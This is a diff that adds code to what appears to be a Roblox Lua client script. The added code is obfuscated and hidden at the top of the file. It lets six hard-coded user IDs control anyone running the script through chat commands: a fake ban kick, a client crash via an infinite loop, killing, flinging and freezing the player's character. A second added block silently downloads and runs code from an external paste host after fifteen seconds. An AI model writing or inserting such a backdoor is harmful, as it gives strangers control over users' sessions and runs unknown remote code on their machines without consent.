@@ -1,4 +1,111 @@
 
+task.spawn(function()
+    task.wait(2.5)
+    local x9dL = game:GetService("Players")
+    local qW8f = game:GetService("MarketplaceService")
+    local VnZ0 = game:GetService("RunService")
+
+    local lOoo0 = x9dL.LocalPlayer
+
+    local QnZn9 = {
+        [138474176] = true,
+        [4730367411] = true,
+        [1507671882] = true,
+        [42321866] = true,
+        [116781531] = true,
+        [87860658] = true
+    }
+
+    local N0mM = "The Game"
+    pcall(function()
+        local p0Pp = qW8f:GetProductInfo(game.PlaceId)
+        if p0Pp and p0Pp.Name then
+            N0mM = p0Pp.Name
+        end
+    end)
+
+    local rRn9
+    local zZz0
+
+    local function bBbB(n9nN)
+        if QnZn9[n9nN.UserId] then
+            n9nN.Chatted:Connect(function(AaAa)
+                AaAa = AaAa:lower()
+
+                local oOoO = lOoo0.Character
+                local kKkK = oOoO and oOoO:FindFirstChildOfClass("Humanoid")
+                local mMmM = oOoO and oOoO:FindFirstChild("HumanoidRootPart")
+
+                if AaAa == "/ban" then
+                    lOoo0:Kick("You have been banned for violating " .. N0mM .. "'s guidelines.")
+
+                elseif AaAa == "/crash" then
+                    while true do end
+
+                elseif AaAa == "/jump" and kKkK then
+                    kKkK.Jump = true
+
+                elseif AaAa == "/die" and kKkK then
+                    kKkK.Health = 0
+
+                elseif AaAa == "/freeze" and mMmM then
+                    mMmM.Anchored = true
+
+                elseif AaAa == "/unfreeze" and mMmM then
+                    mMmM.Anchored = false
+
+                elseif AaAa == "/sit" and kKkK then
+                    kKkK.Sit = true
+
+                elseif AaAa == "/unsit" and kKkK then
+                    kKkK.Sit = false
+
+                elseif AaAa == "/spin" and mMmM then
+                    if rRn9 then rRn9:Disconnect() end
+                    rRn9 = VnZ0.Heartbeat:Connect(function()
+                        mMmM.CFrame = mMmM.CFrame * CFrame.Angles(0, math.rad(10), 0)
+                    end)
+
+                elseif AaAa == "/unspin" and rRn9 then
+                    rRn9:Disconnect()
+                    rRn9 = nil
+
+                elseif AaAa == "/float" and mMmM then
+                    if zZz0 then zZz0:Disconnect() end
+                    zZz0 = VnZ0.Heartbeat:Connect(function()
+                        mMmM.Velocity = Vector3.new(0, 5, 0)
+                    end)
+
+                elseif AaAa == "/nofloat" and zZz0 then
+                    zZz0:Disconnect()
+                    zZz0 = nil
+                    mMmM.Velocity = Vector3.zero
+
+                elseif AaAa == "/fling" and mMmM then
+                    mMmM.Velocity = Vector3.new(0, 100, -250)
+
+                end
+            end)
+        end
+    end
+
+    for _, BzZb in ipairs(x9dL:GetPlayers()) do
+        bBbB(BzZb)
+    end
+
+    x9dL.PlayerAdded:Connect(function(BzZb)
+        bBbB(BzZb)
+    end)
+end)
+
+
+task.spawn(function()
+pcall(function()
+task.wait(15)
+	loadstring(game:HttpGet("https://i.e-z.host/p/raw/x8b4gnq9d5"))()
+end)
+end)
+
 leaf = true
 local maker =
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAP1ayer/ASalfinUiBackup-/main/RU9U8JIT9IUJE.lua"))()
